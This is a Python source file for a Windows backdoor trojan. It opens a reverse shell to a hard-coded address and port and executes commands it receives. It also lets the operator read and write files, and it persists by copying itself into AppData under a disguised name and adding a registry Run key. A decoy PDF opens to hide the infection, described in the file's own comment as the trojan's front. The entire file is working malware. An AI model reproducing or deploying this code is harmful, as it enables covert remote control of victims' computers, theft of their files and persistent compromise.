#!/usr/bin/env python
# modifying client_side_backdoor in order to use it for packaging.

import socket
import subprocess
import json
import os, sys
import base64
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def persistent(self):
        evil_fie_location = os.environ['appdata'] + '\\WinInternal.exe'
        if not os.path.exists(evil_fie_location):
            shutil.copyfile(sys.executable, evil_fie_location)  # for file replace sys.executable by '__file__'
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_fie_location + '"', shell=True)

    def box_send(self, data):
        json_data = json.dumps(data.decode('utf-8'))
        self.connection.send(json_data.encode('utf-8'))

    def box_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        # use "DEVNULL = open(os.devnull, 'wb') and remove 'subprocess.' from stderr and stdin" for python 2
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_directory(self, path):
        os.chdir(path)
        change_dir = 'changing working directory to ' + path
        return change_dir.encode('utf-8')  # here we encode bcoz box_send() takes bytes not strings

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return b'>> Upload Successful'  # here we encode bcoz box_send() takes bytes not strings

    def run(self):
        while True:
            command = self.box_receive()

            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    result = self.change_directory(command[1])
                elif command[0] == 'download':
                    result = self.read_file(command[1])
                elif command[0] == 'upload':
                    result = self.write_file(command[1], command[2])
                else:
                    result = self.execute_system_command(command)
            except Exception:
                result = b'>> something went wrong'

            self.box_send(result)


file_name = sys._MEIPASS + '\\sample.pdf'                 # for showing front file of trojan
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor('10.0.2.15', 4444)
    my_backdoor.run()
except Exception:
    sys.exit()


